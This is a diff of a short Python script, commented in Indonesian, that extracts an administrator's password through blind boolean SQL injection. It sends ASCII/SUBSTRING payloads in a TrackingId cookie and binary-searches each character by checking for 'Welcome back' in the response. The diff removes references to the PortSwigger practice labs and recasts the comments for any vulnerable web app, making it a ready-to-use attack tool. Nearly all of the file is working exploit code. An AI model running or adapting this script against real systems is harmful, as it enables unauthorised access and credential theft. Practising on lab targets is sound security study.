@@ -1,5 +1,4 @@
 import requests
-import string
 
 # 1. Konfigurasi Target (Ganti sesuai URL lab kamu)
 URL = "blablabla.com/"
@@ -7,7 +6,7 @@ URL = "blablabla.com/"
 # Gunakan requests.Session() biar koneksi HTTP di-reuse, jalannya jadi jauh lebih cepat
 session = requests.Session()
 
-# Karakter yang mau kita tebak (a-z, 0-9)
+# siapin password
 password = ""
 
 print("[*] Memulai ekstraksi password administrator...")
@@ -22,8 +21,9 @@ for position in range(1, 21):
         # Payload SQLi untuk mendeteksi karakter di posisi tertentu
         # Menggunakan SUBSTRING untuk mengambil 1 huruf dan mencocokkannya
         payload = f"xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1))>'{mid}"
-        
-        # PortSwigger mendeteksi SQLi lewat Cookie TrackingId
+
+        # bagian Entry yang vuln
+        # mendeteksi SQLi lewat Cookie TrackingId
         cookies = {
             "TrackingId": payload,
             "session": "GANTI_DENGAN_SESSION_COOKIE_KAMU" # Lihat di Storage/Application Burp Suite
@@ -32,7 +32,7 @@ for position in range(1, 21):
         # Kirim request ke server
         response = session.get(URL, cookies=cookies)
         
-        # 3. Indikator True/False (Kondisi spesifik dari lab PortSwigger)
+        # 3. Indikator True/False (Kondisi spesifik tergantung dari webApp)
         if "Welcome back" in response.text:
             low = mid + 1
         else:
@@ -45,5 +45,5 @@ for position in range(1, 21):
     currentChar = chr(low)
     password += currentChar 
     print(f"[+] Karakter {position} ketemu: {currentChar} (ASCII {low}) -> Password sementara: {password}")
-    # lalu dipush ke variable password
+    # lalu dipush ke password
 print(f"\n[Visual] Ekstraksi Selesai! Password administrator: {password}")
